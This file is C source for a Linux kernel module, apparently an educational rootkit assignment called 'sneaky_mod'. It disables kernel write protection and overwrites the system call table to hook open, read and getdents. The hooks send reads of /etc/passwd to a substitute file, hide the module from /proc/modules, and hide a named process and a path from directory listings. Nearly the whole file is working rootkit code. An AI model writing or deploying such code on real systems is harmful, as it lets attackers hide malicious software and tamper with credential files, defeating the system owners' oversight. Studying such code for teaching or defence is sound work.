#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sean Qian");
static int PID=0;
static char *PATH=NULL;
static int FLAG=0;
module_param(PID,int,0);
module_param(PATH, charp, 0);
struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[256];
};


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call_open)(const char *pathname, int flags);
asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_call_read)(int fd, void *buf, unsigned long count);


//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n"); 
  printk(KERN_INFO "Process PID=%d\n",PID);
  if(strcmp(pathname,"/etc/passwd")==0){
    copy_to_user((char *)pathname,"/tmp/passwd",12*sizeof(char));
  }
  if(strcmp(pathname,"/proc/modules")==0){
    FLAG=1;
  }
  return original_call_open(pathname, flags);
}

asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, unsigned long count){
  long buff_len=0;
  char *start = NULL;
  char *end = NULL;
  buff_len = (long)original_call_read(fd, buf, count);
  if(buff_len <=0)
    return buff_len;
  if( ((start=strstr(buf,"sneaky_mod"))!=NULL)&&(FLAG==1)){
    end = start;
    while(*end!='\n'){
      end++;
    }
    FLAG=0;
    memmove(start,end+1,(buff_len-(end+1-(char *)buf))); 
    return (ssize_t)(buff_len-(end+1-start)); 
  }
  return buff_len;
}

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  int buff_len=0;
  int buff_len_temp=0;
  printk(KERN_INFO "getdents was replaced!\n");
  buff_len = original_call_getdents(fd, dirp, count);
  if(buff_len <= 0)
    return buff_len;
  buff_len_temp = buff_len;
  while(buff_len_temp>0){
    buff_len_temp -= dirp->d_reclen;
    if((strcmp(dirp->d_name,"sneaky_process") == 0)||(strcmp(dirp->d_name,PATH) == 0)){
      buff_len -= dirp->d_reclen;
      printk(KERN_INFO "sneaky_process dirent:%s\n",dirp->d_name);
      memmove(dirp,(char *)dirp+dirp->d_reclen,buff_len_temp);
      printk(KERN_INFO "Remove sneaky_process dirent\n");
    }
   else{
      dirp = (struct linux_dirent*)((char *)dirp+dirp->d_reclen);
    }
  }
  return buff_len;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{

  struct page *page_ptr;
  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  //list_del_init(&__this_module.list);
  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  original_call_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;


  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
  printk(KERN_INFO "Sneaky read will be dropped\n");
  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
  printk(KERN_INFO "Sneaky read has been dropped\n");
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

